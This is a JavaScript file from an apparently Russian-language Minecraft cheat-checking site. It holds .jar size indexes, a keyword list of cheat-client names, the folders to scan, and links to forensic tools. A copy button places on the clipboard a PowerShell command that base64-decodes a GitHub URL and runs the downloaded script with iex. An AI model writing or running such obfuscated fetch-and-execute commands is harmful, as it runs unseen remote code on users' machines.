const INDEX_1 = `size:2263|size:5266|size:6515|size:6770|size:6778|size:7016|size:7218|size:7803|size:7891|size:9327|size:10283|size:10605|size:10958|size:11554|size:16541|size:17308|size:17339|size:18180|size:18527|size:18587|size:18734|size:19266|size:20578|size:20583|size:20639|size:20883|size:21161|size:21234|size:21664|size:22036|size:22861|size:26247|size:27546|size:27809|size:28084|size:28439|size:29304|size:29567|size:30279|size:31549|size:31607|size:34449|size:34669|size:35971|size:35993|size:38149|size:39017|size:39321|size:40142|size:42782|size:47159|size:48242|size:50828|size:51212|size:52426|size:54088|size:59381|size:62782|size:65316|size:65486|size:65765|size:66659|size:67491|size:68794|size:69757|size:72334|size:74105|size:80751|size:88896|size:95530|size:98811|size:100523|size:100799|size:101297|size:101571|size:101703|size:102297|size:102733|size:103761|size:104954|size:105623|size:105672|size:112386|size:120640|size:138417|size:143006|size:143597|size:143600|size:147329|size:147873|size:151762|size:153937|size:156722|size:156779|size:166677|size:169718|size:173698|size:183634|size:183651|size:192156|size:202720|size:257482|size:263070|size:267746|size:274865|size:300286|size:334588|size:343169|size:350629|size:409616|size:410358|size:517248|size:519731|size:532826|size:539151|size:556494|size:597406|size:636621|size:640838|size:878781|size:925493|size:1077149|size:1165063|size:1181556|size:1444714|size:1471429|size:1569093|size:1822841|size:3113569|size:3425801|size:3541075|size:3541138|size:3642292|size:3684385|size:4642998|size:5630483|size:7052171|size:7059952|size:22258750|size:25704986|size:26179274|size:26691896 *.jar`;

const INDEX_2 = `size:9951744|size:24536064|size:15438336|size:6229504|size:6573056|size:7187456|size:7969792|size:1562249|size:1672329|size:1677449|size:1680521|size:147329|size:138351|size:202720|size:7788032|size:22885|size:23810|size:138351|size:147329|size:7988736|size:3711166|size:3697285|size:3712014|size:5641728|size:4413440|size:114974|size:111866|size:274865|size:1820884|size:5007380|size:6944256|size:5934592|size:2545664|size:2108662|size:1961742|size:3684385|size:5143837|size:4413440|size:116689|size:1968128|size:8011776|size:1883602|size:5918208|size:1897269|size:31445308|size:24390144|size:25158656|size:2023236|size:16836288|size:88065933|size:197933122|size:2258533|size:2305645|size:2372788|size:18764384|size:9400174|size:2363704|size:15445581|size:2373676|size:138351|size:7788032|size:22885|size:23810|size:7988736|size:3711166|size:3697285|size:3712014|size:5641728|size:4413440|size:111866|size:1820884|size:5007380|size:6944256|size:5934592|size:2545664|size:2108662|size:1961742|size:3684385|size:5143837|size:1968128|size:8011776|size:1883602|size:6533121|size:16629226|size:28107997|size:8249687|size:5524900|size:140200|size:132133|size:110439|size:6244043|size:6867367|size:43883|size:514855|size:479296|size:9530356|size:355527744|size:1819289|size:1897269|size:16855568|size:16964112|size:2023236|size:5918208|size:31445308|size:24390144|size:10657176|size:460288|size:19521024|size:15076480|size:7204864|size:1613824|size:1499136|size:1488896|size:9332326|size:9400174|size:10071288|size:9400174|size:10071288|Baritone|Nursultan`;

const INDEX_3 = `impact | вурст | bleachhack | аристоис | хузуни | skillclient | инерция | арес | сигма | метеор | ликвидбоунс | нурик | нурсултан | целестиал | калестиал | селка | дорого | neverhook | отлично | wexside | дикий клиент | фарш | deadcode | акриен | головоломка | будущее | джессика | dreampool | норулес | конас | ричклиент | rusherhack | thunderhack | moonhack | судный день | nightware | рикардо | extazyy | троксилл | защита от утечки | арбуз | .akr | .wex | даунтиблят | переименовать*ме*пожалуйста | отредактируйте меня | takker | fuzeclient | wisefolder| flauncher | vec.dll | USBOblivion.exe | Feather | delta | venus | baritone | спам -бот | Clean cut | spam_bot | inventory_walk | player_highlighter | aimbot | freecam | bedrock_breaker_mode | viaversion | double_hotbar | elytra_swap | armor_hotswap | smart_moving | chest | savesearcher | topkautobuy | топкаавтобуй | tweakeroo | mob_hitbox | librarian_trade_finder | sacurachorusfind | автоатака | entity_outliner | invmove | viabackwards | viarewind | viafabric | viaforge | viaproxy | vialoader | viamcp | hitbox | elytrahack | DiamondSim | ForgeHax | клиентские команды | Настройки управления | SwingThroughGrass | CutThrough | Haruka | NewLauncher | Blade | Hachclient | Inertia | Fluger | Exloader | CatLean`;

const zones = [
  { path: '%AppData%', desc: 'Roaming целиком: .minecraft, .tlauncher, конфиги и папки чит-клиентов' },
  { path: '%LocalAppData%', desc: 'Локальные данные программ, кэши лаунчеров и спрятанные клиенты' },
  { path: 'Desktop / Downloads / Documents', desc: 'Рабочий стол, загрузки и документы пользователя' },
  { path: 'C:\\Windows\\Prefetch', desc: 'Какие .exe запускать ранее — прямо в приложении и через WinPrefetchView' },
  { path: 'Реестр Windows', desc: 'Автозапуск и список установленных программ' },
  { path: 'Весь диск C:\\ (опция)', desc: 'Глубокий режим: поиск по всему диску + индексация размеров из баз' }
];

const programs = [
  { name: 'Everything', type: 'Поиск', desc: 'Мгновенный поиск по папкам, названиям и весу файлов. Скачивается чекером автоматически.', link: 'https://www.voidtools.com/downloads/' },
  { name: 'JournalTrace', type: 'Trace', desc: 'Отслеживает действия пользователя с файлами и папками.', link: 'https://github.com/ponei/JournalTrace/releases' },
  { name: 'WinPrefetchView', type: 'History', desc: 'Анализ Prefetch — ранее запускавшиеся .exe приложения.', link: 'https://www.nirsoft.net/utils/win_prefetch_view.html' },
  { name: 'ShellBags Analyzer & Cleaner', type: 'Trace', desc: 'Показывает, какие папки посещались и удалялись.', link: 'https://privazer.com/en/download-shellbag-analyzer-shellbag-cleaner.php' },
  { name: 'CheatCheck (авто-скан)', type: 'Авто', desc: 'Нативный сканер: зоны, сигнатуры, размеры .jar, Prefetch и реестр — в одном .exe.', link: '#download' },
  { name: 'Process Hacker 2', type: 'Memory', desc: 'Анализ памяти и процессов для поиска спрятанных читов.', link: 'https://processhacker.sourceforge.io/downloads.php' },
  { name: 'SystemInformer', type: 'Memory', desc: 'Анализ памяти и процессов для поиска спрятанных читов.', link: 'https://systeminformer.sourceforge.io/downloads.php' },
  { name: 'USB-DriveLog', type: 'USB', desc: 'Отслеживает подключение/отключение USB флешек.', link: 'https://www.nirsoft.net/utils/usb_drive_log.html' },
  { name: 'USB-Deview', type: 'USB', desc: 'Отслеживает подключение/отключение USB устройств.', link: 'https://www.nirsoft.net/utils/usb_devices_view.html' },
  { name: 'ExecutedProgramsList', type: 'History', desc: 'Поиск и анализ ранее запускавшихся программ.', link: 'https://www.nirsoft.net/utils/executed_programs_list.html' },
  { name: 'LastActivityView', type: 'History', desc: 'Анализ активности ПК для поиска запускавшихся .exe-читов.', link: 'https://www.nirsoft.net/utils/computer_activity_view.html' },
  { name: 'OpenSaveFilesView', type: 'History', desc: 'Информация о запускавшихся файлах в памяти системы.', link: 'https://www.nirsoft.net/utils/open_save_files_view.html' }
];

const indexTexts = { index1: INDEX_1, index2: INDEX_2, index3: INDEX_3 };

function renderZones() {
  const grid = document.getElementById('zonesGrid');
  if (!grid) return;
  grid.innerHTML = zones.map((z) => `
    <div class="zone">
      <b>${z.path}</b>
      <span>${z.desc}</span>
    </div>
  `).join('');
}

function renderPrograms() {
  const grid = document.getElementById('programsGrid');
  if (!grid) return;
  grid.innerHTML = programs.map((p) => `
    <article class="program">
      <div class="program__top">
        <h3 class="program__name">${p.name}</h3>
        <span class="program__type">${p.type}</span>
      </div>
      <p class="program__desc">${p.desc}</p>
      <a href="${p.link}" class="program__link" ${p.link.startsWith('#') ? '' : 'target="_blank" rel="noopener"'}>Скачать →</a>
    </article>
  `).join('');
}

function fillIndexTexts() {
  document.getElementById('index1').textContent = INDEX_1;
  document.getElementById('index2').textContent = INDEX_2;
  document.getElementById('index3').textContent = INDEX_3;
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    const area = document.createElement('textarea');
    area.value = text;
    area.style.position = 'fixed';
    area.style.opacity = '0';
    document.body.appendChild(area);
    area.select();
    const ok = document.execCommand('copy');
    document.body.removeChild(area);
    return ok;
  }
}

function showToast(msg = 'Скопировано в буфер обмена') {
  const toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.classList.add('toast--show');
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => toast.classList.remove('toast--show'), 2500);
}

function initCopyButtons() {
  document.querySelectorAll('.copy-btn').forEach((btn) => {
    btn.addEventListener('click', async () => {
      const text = indexTexts[btn.dataset.copy];
      if (text && await copyText(text)) showToast();
    });
  });

  const psBtn = document.getElementById('copyPsBtn');
  if (psBtn) {
    psBtn.addEventListener('click', async () => {
      const cmd = 'iex (iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aHR0cHM6Ly9naXRodWIuY29tL2ZsaXNoa2FzL2NoZWNrZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9pbml0aWFsaXphdGlvbi5wczE=\'))))';
      if (await copyText(cmd)) showToast('Команда PowerShell скопирована');
    });
  }
}

function initNavHighlight() {
  const pills = document.querySelectorAll('.header__nav a[href^="#"]:not(.header__cta)');
  const ids = ['zones', 'programs', 'index-1', 'index-2', 'index-3'];

  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (!entry.isIntersecting) return;
      const id = entry.target.id;
      pills.forEach((pill) => {
        const active = pill.getAttribute('href') === `#${id}`;
        pill.style.color = active ? 'var(--red)' : '';
      });
    });
  }, { rootMargin: '-40% 0px -50% 0px', threshold: 0 });

  ids.forEach((id) => {
    const el = document.getElementById(id);
    if (el) observer.observe(el);
  });
}

document.addEventListener('DOMContentLoaded', () => {
  renderZones();
  renderPrograms();
  fillIndexTexts();
  initCopyButtons();
  initNavHighlight();
});
